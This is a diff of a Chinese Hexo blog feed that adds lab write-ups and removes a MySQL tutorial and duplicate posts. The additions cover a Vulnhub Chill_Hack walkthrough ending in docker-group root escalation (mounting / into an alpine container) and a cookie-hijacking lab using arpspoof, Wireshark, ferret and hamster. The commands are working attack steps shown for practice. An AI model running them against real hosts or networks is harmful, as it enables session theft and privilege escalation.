+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可疑密码:IWQwbnRLbjB3bVlwQHNzdzByZA&#x3D;&#x3D;</span><br><span class="line">用户名:Anurodh</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/26/YJCoa4St6RjrUEu.png" alt="image-20210426210916149"></p>
+<p>到Base64解密网站解密</p>
+<p><img src="https://i.loli.net/2021/04/26/vRjZdbe4qyJUspm.png" alt=""></p>
+<p>密码为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!d0ntKn0wmYp@ssw0rd</span><br></pre></td></tr></table></figure>
+<p>使用ssh登录,先尝试可疑用户Anurodh</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh anurodh@192.168.88.139 #成功,注意名字是小写a</span><br></pre></td></tr></table></figure>
+<p>登录成功</p>
+<p><img src="https://i.loli.net/2021/04/26/D5LTYFab7f31V9h.png" alt=""></p>
+<p>使用id命令查看用户的ID,以及所属群组的ID,发现其中有docker</p>
+<p><img src="https://i.loli.net/2021/04/26/JVYsKEo2vwqSrPj.png" alt="image-20210426212318640"></p>
+<p>尝试利用<a href="https://www.freebuf.com/articles/system/170783.html">docker漏洞</a>获取root权限(将外面的文件映射到docker容器中,docker中是以root运行的)</p>
+<p>查看docker镜像</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/26/nK3ZoPrD2lQGbBY.png" alt=""></p>
+<p>将根目录挂载到/mnt并放入alpine镜像</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it -v /:/mnt alpine</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/26/1Lnopjmg2F9qDZY.png" alt="image-20210426213345460"></p>
+<p>查看id</p>
+<p><img src="https://i.loli.net/2021/04/26/qdyLvrmj9XNgxcO.png" alt=""></p>
+<p>查看/root没有发现信息</p>
+<p>继续查看相关目录,发现/mnt下有一个root目录</p>
+<p><img src="https://i.loli.net/2021/04/26/ZrMKItUjVe2gEQ5.png" alt="image-20210426213931659"></p>
+<p>进入/mnt/root并查看,发现有个proof.txt</p>
+<p><img src="https://i.loli.net/2021/04/26/oVD9MzpJ2UGA1ba.png" alt=""></p>
+<p>查看proof.txt</p>
+<p><img src="https://i.loli.net/2021/04/26/Z85j6lciFKok91W.png" alt=""></p>
+<p>成功得到root的flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Hack</category>
+      </categories>
+      <tags>
+        <tag>Hack</tag>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>http cookies劫持实验</title>
+    <url>/article/ab23bf02.html</url>
+    <content><![CDATA[<h1 id="http-cookies劫持实验"><a href="#http-cookies劫持实验" class="headerlink" title="http cookies劫持实验"></a>http cookies劫持实验</h1><a id="more"></a>
+<h2 id="1、首先保证虚拟机中的kali系统能够和外部网络通信"><a href="#1、首先保证虚拟机中的kali系统能够和外部网络通信" class="headerlink" title="1、首先保证虚拟机中的kali系统能够和外部网络通信"></a>1、首先保证虚拟机中的kali系统能够和外部网络通信</h2><p>查看设置——虚拟网络编辑器——桥接无线网卡—虚拟机有线设置DHCP</p>
+<p><img src="https://i.loli.net/2021/04/27/zPQdo2pJO1TM4CV.png" alt=""></p>
+<p><img src="https://i.loli.net/2021/04/27/A5JflRVZI4tCWpa.png" alt=""></p>
+<p>ifconfig命令查看IP</p>
+<p><img src="https://i.loli.net/2021/04/27/7Vziadp845wtgkA.png" alt=""></p>
+<p>kali的ip为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.43.41</span><br></pre></td></tr></table></figure>
+<p>ping测试</p>
+<p><img src="https://i.loli.net/2021/04/27/sd8KJPNqcDHR5l2.png" alt=""></p>
+<h2 id="2、扫描存活的主机"><a href="#2、扫描存活的主机" class="headerlink" title="2、扫描存活的主机"></a>2、扫描存活的主机</h2><p>使用nmap扫描存活主机</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -T4 -A -v 192.168.43.0&#x2F;24</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/27/8DGa3TYmBKuHREX.png" alt=""></p>
+<p>发现本机IP为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.43.55</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/27/mhdNcS9zLa1DnFo.png" alt=""></p>
+<h2 id="3、用户的登录信息cookies"><a href="#3、用户的登录信息cookies" class="headerlink" title="3、用户的登录信息cookies"></a>3、用户的登录信息cookies</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward #开启kali路由转发功能</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/27/CORoeXyGJMYkLE1.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.43.1 192.168.43.55  </span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/27/SbU3WRszNihIVDK.png" alt=""></p>
+<p>在kali打开wireshark抓包,同时在本机访问网站并登录</p>
+<p>wireshark保存窃取的流量为test.pacp文件</p>
+<p><img src="https://i.loli.net/2021/04/27/VtrHT6EMQDUO9Ac.png" alt=""></p>
+<p>在目标主机上登录相对应的网站，尽量选择安全性较低的，登录要留存过程   </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ferret -r test.pcap</span><br></pre></td></tr></table></figure>
+<p>处理流量，生成cookies文件hamster.text</p>
+<p>启动hamster</p>
+<p>打开浏览器地址栏输入127.0.0.1:1234<br>hamaster  找到目标IP 登录目标用户的网站</p>
+<p><img src="https://i.loli.net/2021/04/27/yXlI61sZz5dhE8V.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>Hack</category>
+      </categories>
+      <tags>
+        <tag>Hack</tag>
       </tags>
   </entry>
   <entry>
@@ -2797,342 +3076,6 @@
       </tags>
   </entry>
   <entry>
-    <title>数据库学习笔记</title>
-    <url>/article/49140.html</url>
-    <content><![CDATA[<h1 id="数据库学习笔记"><a href="#数据库学习笔记" class="headerlink" title="数据库学习笔记"></a>数据库学习笔记</h1><a id="more"></a>
-<h2 id="数据库的相关概念"><a href="#数据库的相关概念" class="headerlink" title="数据库的相关概念"></a>数据库的相关概念</h2><h3 id="DB"><a href="#DB" class="headerlink" title="DB"></a>DB</h3><p>数据库(database) :存储数据的”仓库”,它保存了一系列有组织的数据</p>
-<h4 id="数据库存储的特点"><a href="#数据库存储的特点" class="headerlink" title="数据库存储的特点"></a>数据库存储的特点</h4><ol>
-<li>将数据放到表中,表再放到库中</li>
-<li>一个数据库中可以有多个表,每个表都有一个的名字,用来标识自己.表名具有唯一性</li>
-<li>表具有一些特性,这些特性定义了数据在表中如何存储</li>
-<li>表由列组成,我们也称为字段.所有表都是由一个或多个列组成的</li>
-<li>表中的数据是按行存储的</li>
-</ol>
-<h3 id="DBMS"><a href="#DBMS" class="headerlink" title="DBMS"></a>DBMS</h3><p>数据库管理系统(Database Management System).数据库是通过DBMS创建和操作的容器</p>
-<p>常见的数据库管理系统:MySQL、Oracle、DB2、SqlServer等</p>
-<h4 id="DBMS分为两类"><a href="#DBMS分为两类" class="headerlink" title="DBMS分为两类"></a>DBMS分为两类</h4><ul>
-<li>基于共享文件系统的DBMS(Access)</li>
-<li>基于客户机—服务器的DBMS(MySQL、Oracle、SqlServer)</li>
-</ul>
-<h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><ul>
-<li>成本低,开放源代码,一般可以免费试用</li>
-<li>性能高,执行很快,可移植性好</li>
-<li>简单,很容易安装和使用</li>
-<li>社区版(免费),企业版(收费)</li>
-</ul>
-<h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>结构化查询语言(Structure Query Language) :专门用来与数据库通信的语言</p>
-<h4 id="SQL的优点"><a href="#SQL的优点" class="headerlink" title="SQL的优点"></a>SQL的优点</h4><ol>
-<li>不是某个特定数据库供应商专有的语言,几乎所有DBMS都支持SQL</li>
-<li>简单易学</li>
-<li>虽然简单,但实际上是一种强有力的语言,灵活使用其语言元素,可以进行非常复杂和高级的数据库操作</li>
-</ol>
-<h2 id="MySQL的下载安装"><a href="#MySQL的下载安装" class="headerlink" title="MySQL的下载安装"></a>MySQL的下载安装</h2><h3 id="下载MySQL"><a href="#下载MySQL" class="headerlink" title="下载MySQL"></a>下载MySQL</h3><p><a href="https://dev.mysql.com/downloads/installer/">下载地址</a></p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302094528470.png" alt=""></p>
-<p>点击Download后,可能出现下面的页面,点击红框所选部分</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302094703889.png" alt=""></p>
-<h3 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h3><p>找到下载的MySQL安装文件,双击运行</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302095639682.png" alt=""></p>
-<p>等待片刻</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210302095740307.png" alt=""></p>
-<p>选择Developer Default,点击next</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303093015459.png" alt=""></p>
-<p>点击Execute</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303093138351.png" alt=""></p>
-<p>等待下载,之后点击Next</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303093211445.png" alt=""></p>
-<p>点击Next</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094141765.png" alt=""></p>
-<p>点击Next</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094228963.png" alt=""></p>
-<p>点击Next</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094310677.png" alt=""></p>
-<p>设置管理员密码,之后点击Next</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094452191.png" alt=""></p>
-<p>点击Next</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094649157.png" alt=""></p>
-<p>点击Execute</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303094735428.png" alt=""></p>
-<p>点击Finish</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095153339.png" alt=""></p>
-<p>点击Next</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095216696.png" alt=""></p>
-<p>点击Finish</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095243443.png" alt=""></p>
-<p>点击Next</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095315014.png" alt=""></p>
-<p>输入密码,之后点击Check</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095359691.png" alt=""></p>
-<p>连接成功,点击Next</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095426064.png" alt=""></p>
-<p>点击Execute</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095459981.png" alt=""></p>
-<p>点击Finish</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095531238.png" alt=""></p>
-<p>点击Next</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095601082.png" alt=""></p>
-<p>点击Finish,安装完毕</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210303095619642.png" alt=""></p>
-<h2 id="关系数据库标准语言SQL"><a href="#关系数据库标准语言SQL" class="headerlink" title="关系数据库标准语言SQL"></a>关系数据库标准语言SQL</h2><h3 id="学生-课程数据库"><a href="#学生-课程数据库" class="headerlink" title="学生-课程数据库"></a>学生-课程数据库</h3><table>
-    <caption>Student</caption>
-    <tr>
-        <th>学号</br>Sno</th>
-        <th>姓名</br>Sname</th>
-        <th>性别</br>Ssex</th>
-        <th>年龄</br>Sage</th>
-        <th>所在系</br>Sdept</th>
-    </tr>
-    <tr>
-        <td>201215121</td>
-        <td>李勇</td>
-        <td>男</td>
-        <td>20</td>
-        <td>CS</td>
-    </tr>
-    <tr>
-        <td>201215122</td>
-        <td>刘晨</td>
-        <td>女</td>
-        <td>19</td>
-        <td>CS</td>
-    </tr>
-    <tr>
-        <td>201215123</td>
-        <td>王敏</td>
-        <td>女</td>
-        <td>18</td>
-        <td>MA</td>
-    </tr>
-    <tr>
-        <td>201215125</td>
-        <td>张立</td>
-        <td>男</td>
-        <td>19</td>
-        <td>IS</td>
-    </tr>
-</table>
-<table>
-    <caption>Course</caption>
-    <tr>
-        <th>课程号</br>Cno</th>
-        <th>课程名</br>Cname</th>
-        <th>先行课</br>Cpno</th>
-        <th>学分</br>Ccredit</th>
-    </tr>
-    <tr>
-        <td>1</td>
-        <td>数据库</td>
-        <td>5</td>
-        <td>4</td>
-    </tr>
-    <tr>
-        <td>2</td>
-        <td>数学</td>
-        <td></td>
-        <td>2</td>
-    </tr>
-    <tr>
-        <td>3</td>
-        <td>信息系统</td>
-        <td>1</td>
-        <td>4</td>
-    </tr>
-    <tr>
-        <td>4</td>
-        <td>操作系统</td>
-        <td>6</td>
-        <td>3</td>
-    </tr>
-    <tr>
-        <td>5</td>
-        <td>数据结构</td>
-        <td>7</td>
-        <td>4</td>
-    </tr>
-    <tr>
-        <td>6</td>
-        <td>数据处理</td>
-        <td></td>
-        <td>2</td>
-    </tr>
-    <tr>
-        <td>7</td>
-        <td>PASCAL语言</td>
-        <td>6</td>
-        <td>4</td>
-    </tr>
-</table>
-<table>
-    <caption>SC</caption>
-    <tr>
-        <th>学号</br>Sno</th>
-        <th>课程号</br>Cno</th>
-        <th>成绩</br>Grade</th>
-    </tr>
-    <tr>
-        <td>201215121</td>
-        <td>1</td>
-        <td>92</td>
-    </tr>
-    <tr>
-        <td>201215121</td>
-        <td>1</td>
-        <td>92</td>
-    </tr>
-    <tr>
-        <td>201215121</td>
-        <td>2</td>
-        <td>85</td>
-    </tr>
-    <tr>
-        <td>201215121</td>
-        <td>3</td>
-        <td>88</td>
-    </tr>
-    <tr>
-        <td>201215122</td>
-        <td>2</td>
-        <td>90</td>
-    </tr>
-    <tr>
-        <td>201215122</td>
-        <td>3</td>
-        <td>80</td>
-    </tr>
-</table>
-### 数据定义
-
-
-
-### 数据查询
-
-#### 单表查询
-
-##### 选择表中若干列
-
-> 查询全体学生的姓名,出生年份和所在的院系,要求用小写字母表示系名(现在年份为2021)
-
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,<span class="string">&#x27;Year of Birth&#x27;</span>,<span class="number">2021</span><span class="operator">-</span>Sage,<span class="built_in">LOWER</span>(Sdept)</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br></pre></td></tr></table></figure>
-![](https://gitee.com/wxpgitee/images/raw/master/image-20210329222607438.png)
-
-> 通过指定别名改变查询结果的列标题
-
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname NAME,<span class="string">&#x27;Year of Birth&#x27;</span> BIRTH,<span class="number">2021</span><span class="operator">-</span>Sage BIRTHDAY,<span class="built_in">LOWER</span>(Sdept) DEPARTMENT</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br></pre></td></tr></table></figure>
-![](https://gitee.com/wxpgitee/images/raw/master/image-20210329222841512.png)
-
-##### 选择表中若干元组
-
-##### 消除取值重复的行
-
-两个本来并不完全相同的元组在投影到指定的某些列上后,可能会变成相同的行.可以用DISTINCT消除它们,如果没有指定DISTINCT关键词,则默认为ALL
-
-> 查询选修了课程的学生学号
-
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br></pre></td></tr></table></figure>
-![](https://gitee.com/wxpgitee/images/raw/master/image-20210329223333574.png)
-
->查询选修了课程的学生学号,使用DISTINCT消除重复行
-
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Sno</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br></pre></td></tr></table></figure>
-![](https://gitee.com/wxpgitee/images/raw/master/image-20210329223506629.png)
-
-##### 查询满足条件的元组
-
-查询满足条件的元组可以通过WHERE子句实现
-
-<table>
-    <caption>WHERE子句常用的查询条件</caption>
-    <tr>
-        <th>查询条件</th>
-        <th>谓词</th>
-    </tr>
-    <tr>
-        <td>比较</td>
-        <td>=,>,!=,!>等</td>
-    </tr>
-    <tr>
-        <td>确定范围</td>
-        <td>BETWEEN AND,NOT BETWEEN AND</td>
-    </tr>
-    <tr>
-        <td>确定集合</td>
-        <td>IN,NOT IN</td>
-    </tr>
-    <tr>
-        <td>字符匹配</td>
-        <td>LIKE,NOT LIKE</td>
-    </tr>
-    <tr>
-        <td>空值</td>
-        <td>IS NULL,IS NOT NULL</td>
-    </tr>
-    <tr>
-        <td>多重条件(逻辑运算)</td>
-        <td>AND,OR,NOT</td>
-    </tr>
-</table>
-
-<h3 id="LIKE运算符"><a href="#LIKE运算符" class="headerlink" title="LIKE运算符"></a>LIKE运算符</h3><p>进行字符串的匹配</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> students</span><br><span class="line"><span class="keyword">WHERE</span> Sno <span class="keyword">LIKE</span> <span class="string">&#x27;201215121&#x27;</span></span><br><span class="line"><span class="comment">-- 等价于 WHERE Sno=&#x27;201215121&#x27;</span></span><br><span class="line"><span class="comment">--如果LIKE后的匹配串中不含通配符,则可以用=代替;用!=或&lt;&gt;运算符代替NOT LIKE</span></span><br><span class="line"><span class="keyword">WHERE</span> Sname <span class="keyword">LIKE</span> <span class="string">&#x27;刘%&#x27;</span></span><br><span class="line"><span class="comment">-- %代表任意长度(长度可以为0)的字符串</span></span><br><span class="line"><span class="keyword">WHERE</span> Sname <span class="keyword">LIKE</span> <span class="string">&#x27;欧阳_&#x27;</span></span><br><span class="line"><span class="comment">-- _代表任意单个字符;数据库字符集为ASCII时一个汉字需要两个_,当字符集为GBK时需要一个_</span></span><br><span class="line"><span class="keyword">WHERE</span> Cname <span class="keyword">LIKE</span> <span class="string">&#x27;DB\_Design&#x27;</span> <span class="keyword">ESCAPE</span><span class="string">&#x27;\&#x27;</span></span><br><span class="line"><span class="comment">-- 如果要查询的字符串本身就含有通配符%或_,这时需要使用ESCAPE&#x27;&lt;换码字符&gt;&#x27;对通配符进行转义;ESCAPE&#x27;\&#x27;表示&#x27;\&#x27;为换码字符</span></span><br></pre></td></tr></table></figure>
-<h3 id="REGEXP运算符"><a href="#REGEXP运算符" class="headerlink" title="REGEXP运算符"></a>REGEXP运算符</h3><p>正则表达式的缩写(regular expression)</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line"><span class="comment">-- WHERE last_name LIKE &#x27;%field%&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> last_name REGEXP <span class="string">&#x27;field&#x27;</span></span><br><span class="line"><span class="comment">-- 等价与用LIKE</span></span><br><span class="line"><span class="keyword">WHERE</span> last_name REGEXP <span class="string">&#x27;^field&#x27;</span></span><br><span class="line"><span class="comment">-- &#x27;^&#x27;表示以什么开头</span></span><br><span class="line"><span class="keyword">WHERE</span> last_name REGEXP <span class="string">&#x27;field$&#x27;</span></span><br><span class="line"><span class="comment">-- &#x27;$&#x27;表示以什么结尾</span></span><br><span class="line"><span class="keyword">WHERE</span> last_name REGEXP <span class="string">&#x27;field|mac|rose&#x27;</span></span><br><span class="line"><span class="comment">-- &#x27;|&#x27;表示或</span></span><br><span class="line"><span class="keyword">WHERE</span> last_name REGEXP <span class="string">&#x27;[a-j]e&#x27;</span></span><br><span class="line"><span class="comment">-- [a-j]表示a到j任意一个字母</span></span><br></pre></td></tr></table></figure>
-<h3 id="IS-NULL运算符"><a href="#IS-NULL运算符" class="headerlink" title="IS  NULL运算符"></a>IS  NULL运算符</h3><p>搜索缺失属性的记录</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line"><span class="keyword">WHERE</span> phone <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="comment">-- 查找电话号码为NULL</span></span><br><span class="line"><span class="keyword">WHERE</span> phone <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="comment">-- 查找电话号码不为NULL</span></span><br></pre></td></tr></table></figure>
-<h3 id="ORDER-BY子句"><a href="#ORDER-BY子句" class="headerlink" title="ORDER BY子句"></a>ORDER BY子句</h3><p>对查询结果按照一个或多个属性列的升序(ASC)或降序(DESC)排列,默认为升序.对于空值,排序时显示的次序由具体系统实现来决定.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> Sdept,Sage <span class="keyword">DESC</span></span><br><span class="line"><span class="comment">-- 查询结果按照所在系的系号升序排列,同一系中学生按照年龄降序排列</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name,last_name</span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> birth_date</span><br><span class="line"><span class="comment">-- 选择first_name和last_name两列然后按照birth_date排序</span></span><br></pre></td></tr></table></figure>
-<h3 id="聚集函数"><a href="#聚集函数" class="headerlink" title="聚集函数"></a>聚集函数</h3><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>聚集函数</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>COUNT(*)</td>
-<td>统计元组个数</td>
-</tr>
-<tr>
-<td>COUNT([DISTINCT\</td>
-<td>ALL] &lt;列名&gt;)</td>
-<td>统计一列中值的个数</td>
-</tr>
-<tr>
-<td>SUM([DISTINCT\</td>
-<td>ALL] &lt;列名&gt;)</td>
-<td>计算一列值的总和(此列必须为数值型)</td>
-</tr>
-<tr>
-<td>AVG([DISTINCT\</td>
-<td>ALL] &lt;列名&gt;)</td>
-<td>计算一列值的平均值(此列必须为数值型)</td>
-</tr>
-<tr>
-<td>MAX([DISTINCT\</td>
-<td>ALL] &lt;列名&gt;)</td>
-<td>求一列值中的最大值</td>
-</tr>
-<tr>
-<td>MIN([DISTINCT\</td>
-<td>ALL] &lt;列名&gt;)</td>
-<td>求一列值中的最小值</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p>当聚集函数遇到空值时,除COUNT(*)外,都跳过空值而只处理非空值.COUNT(*)是对元组进行计数,某个元组的一个或部分列取空值不影响COUNT的统计结果</p>
-<h3 id="LIMIT子句"><a href="#LIMIT子句" class="headerlink" title="LIMIT子句"></a>LIMIT子句</h3><p>限制查询返回的记录,LIMIT子句要放在最后</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line">LIMIT <span class="number">3</span></span><br><span class="line"><span class="comment">-- 限制返回结果为前3个</span></span><br><span class="line">LIMIT <span class="number">6</span>,<span class="number">3</span></span><br><span class="line"><span class="comment">-- 跳过前6个,再选择3个</span></span><br></pre></td></tr></table></figure>
-<h3 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h3>]]></content>
-      <categories>
-        <category>数据库</category>
-      </categories>
-      <tags>
-        <tag>数据库</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>github无法打开或加载慢的解决方法</title>
     <url>/article/7cc3ca60.html</url>
     <content><![CDATA[<h1 id="github无法打开或加载慢的解决方法"><a href="#github无法打开或加载慢的解决方法" class="headerlink" title="github无法打开或加载慢的解决方法"></a>github无法打开或加载慢的解决方法</h1><a id="more"></a>
@@ -3198,211 +3141,6 @@
       </categories>
       <tags>
         <tag>github</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>http cookies劫持实验</title>
-    <url>/article/ab23bf02.html</url>
-    <content><![CDATA[<h1 id="http-cookies劫持实验"><a href="#http-cookies劫持实验" class="headerlink" title="http cookies劫持实验"></a>http cookies劫持实验</h1><a id="more"></a>
-<h2 id="1、首先保证虚拟机中的kali系统能够和外部网络通信"><a href="#1、首先保证虚拟机中的kali系统能够和外部网络通信" class="headerlink" title="1、首先保证虚拟机中的kali系统能够和外部网络通信"></a>1、首先保证虚拟机中的kali系统能够和外部网络通信</h2><p>查看设置——虚拟网络编辑器——桥接无线网卡—虚拟机有线设置DHCP</p>
-<p><img src="https://i.loli.net/2021/04/27/zPQdo2pJO1TM4CV.png" alt=""></p>
-<p><img src="https://i.loli.net/2021/04/27/A5JflRVZI4tCWpa.png" alt=""></p>
-<p>ifconfig命令查看IP</p>
-<p><img src="https://i.loli.net/2021/04/27/7Vziadp845wtgkA.png" alt=""></p>
-<p>kali的ip为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.43.41</span><br></pre></td></tr></table></figure>
-<p>ping测试</p>
-<p><img src="https://i.loli.net/2021/04/27/sd8KJPNqcDHR5l2.png" alt=""></p>
-<h2 id="2、扫描存活的主机"><a href="#2、扫描存活的主机" class="headerlink" title="2、扫描存活的主机"></a>2、扫描存活的主机</h2><p>使用nmap扫描存活主机</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -T4 -A -v 192.168.43.0&#x2F;24</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/27/8DGa3TYmBKuHREX.png" alt=""></p>
-<p>发现本机IP为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.43.55</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/27/mhdNcS9zLa1DnFo.png" alt=""></p>
-<h2 id="3、用户的登录信息cookies"><a href="#3、用户的登录信息cookies" class="headerlink" title="3、用户的登录信息cookies"></a>3、用户的登录信息cookies</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward #开启kali路由转发功能</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/27/CORoeXyGJMYkLE1.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.43.1 192.168.43.55  </span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/27/SbU3WRszNihIVDK.png" alt=""></p>
-<p>在kali打开wireshark抓包,同时在本机访问网站并登录</p>
-<p>wireshark保存窃取的流量为test.pacp文件</p>
-<p><img src="https://i.loli.net/2021/04/27/VtrHT6EMQDUO9Ac.png" alt=""></p>
-<p>在目标主机上登录相对应的网站，尽量选择安全性较低的，登录要留存过程   </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ferret -r test.pcap</span><br></pre></td></tr></table></figure>
-<p>处理流量，生成cookies文件hamster.text</p>
-<p>启动hamster</p>
-<p>打开浏览器地址栏输入127.0.0.1:1234<br>hamaster  找到目标IP 登录目标用户的网站</p>
-<p><img src="https://i.loli.net/2021/04/27/yXlI61sZz5dhE8V.png" alt=""></p>
-]]></content>
-      <categories>
-        <category>Hack</category>
-      </categories>
-      <tags>
-        <tag>Hack</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基于vulnhub的Chill_Hack靶机的渗透测试</title>
-    <url>/article/d0f0a8c5.html</url>
-    <content><![CDATA[<h1 id="基于vulnhub的Chill-Hack靶机的渗透测试"><a href="#基于vulnhub的Chill-Hack靶机的渗透测试" class="headerlink" title="基于vulnhub的Chill_Hack靶机的渗透测试"></a>基于vulnhub的Chill_Hack靶机的渗透测试</h1><a id="more"></a>
-<h2 id="一-实验准备"><a href="#一-实验准备" class="headerlink" title="一.实验准备"></a>一.实验准备</h2><p>kali,Chill_Hack靶机</p>
-<p>kali要选择NAT方式连接</p>
-<p><img src="https://i.loli.net/2021/04/27/gMoeEk87L2GwQhc.png" alt=""></p>
-<h2 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h2><h3 id="1-收集靶机IP"><a href="#1-收集靶机IP" class="headerlink" title="1.收集靶机IP"></a>1.收集靶机IP</h3><p>查看kali的IP,如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.88.136</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426170748334.png" alt=""></p>
-<p>用nmap扫描存活的主机</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.88.0/24  </span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426171053710.png" alt=""></p>
